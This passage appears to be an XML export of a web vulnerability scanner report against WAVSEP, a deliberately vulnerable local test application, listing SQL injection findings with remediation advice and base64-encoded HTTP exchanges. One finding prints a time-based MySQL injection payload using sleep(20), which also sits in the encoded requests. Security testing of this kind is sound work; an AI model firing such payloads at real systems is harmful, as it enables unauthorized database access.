      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVRpbWVEZWxheS1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IENhdXNlIGEgZGVsYXkgaW4gZGF0YWJhc2UgcmVzcG9uc2UgdGltZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVRpbWVEZWxheS1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IENhdXNlIGEgZGVsYXkgaW4gZGF0YWJhc2UgcmVzcG9uc2UgdGltZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3645946168834743296</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case03-InjsectionInSearch-RetrieveMultipleValuesInSingleColumn-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case03-InjsectionInSearch-RetrieveMultipleValuesInSingleColumn-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>19997</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAzLUluanNlY3Rpb25JblNlYXJjaC1SZXRyaWV2ZU11bHRpcGxlVmFsdWVzSW5TaW5nbGVDb2x1bW4tVW5pb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1NzowNCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAzLUluanNlY3Rpb25JblNlYXJjaC1SZXRyaWV2ZU11bHRpcGxlVmFsdWVzSW5TaW5nbGVDb2x1bW4tVW5pb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjA0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIG11bHRpcGxlIHZhbHVlcyBpbiBzaW5nbGUgY29sdW1uIGZyb20gdGFibGUgJ3VzZXJzJzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAzLUluanNlY3Rpb25JblNlYXJjaC1SZXRyaWV2ZU11bHRpcGxlVmFsdWVzSW5TaW5nbGVDb2x1bW4tVW5pb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjI0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIG11bHRpcGxlIHZhbHVlcyBpbiBzaW5nbGUgY29sdW1uIGZyb20gdGFibGUgJ3VzZXJzJzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2117649017826172928</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case04-InjectionInSearch-ListingDatabaseContents-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case04-InjectionInSearch-ListingDatabaseContents-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
